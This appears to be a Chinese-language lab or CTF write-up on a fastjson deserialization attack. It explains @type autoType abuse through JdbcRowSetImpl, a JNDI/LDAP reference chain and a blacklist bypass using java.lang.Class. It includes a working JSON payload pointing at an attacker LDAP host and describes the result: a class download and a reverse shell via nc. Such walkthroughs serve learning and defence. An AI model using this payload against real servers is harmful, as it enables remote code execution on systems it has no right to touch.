### **<span style="color:#3498db">fastjson 原理：@type 可以指定"反序列化成什么类"</span>**

**fastjson** 是 Java 里把对象 ↔ JSON 互转的工具。它的一个核心特性是：JSON 里可以带 **`@type` 字段，指定这段 JSON 要反序列化成哪个类**。开了 autoType 的话，攻击者就能指定**任意类**——那就挑一个"setter 里会顺手发起 JNDI 查询"的类，经典选择是 `com.sun.rowset.JdbcRowSetImpl`：

- 给它 `dataSourceName` 传 `ldap://攻击机:1389/exp`，它会去 lookup 这个地址；
- 给它 `autoCommit: true`，触发对应的 setter 调用。

于是又是那条熟路：**JNDI → LDAP reference → 加载恶意类 → 静态代码块执行**。

第一次直接打，报错 `set property error, autoCommit`——**大概率是 autoType 黑名单把 `JdbcRowSetImpl` 拦了**：

![mm](/assets/img/2025-07-27-16-14-31.png)

### **<span style="color:#3498db">黑名单绕过</span>**

绕过思路：**先用一个无害类把"目标类名"提前声明进去**。`java.lang.Class` 不在黑名单里，用它加载一次 `JdbcRowSetImpl`，后端就认为这个类"已经出现过了"，后面再引用时不再走黑名单校验：

```json
{
  "a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
  "b": {"@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://10.10.1.186:1389/exp", "autoCommit": true}
}
```

![mm](/assets/img/2025-07-27-16-23-18.png)

返回里还是那句 `set property error`——但 **lookup 已经发出去了**：左上角 LDAP 面板打出"reference result sent"，右上 HTTP 面板记到靶机在下载 `Exp.class`，左下 nc 弹回了 `fastjson` 用户的 shell。

**报错 ≠ 没打中**。这个漏洞的判断标准从来不是响应内容，而是**看自己的 LDAP/HTTP 监听器有没有来请求**。
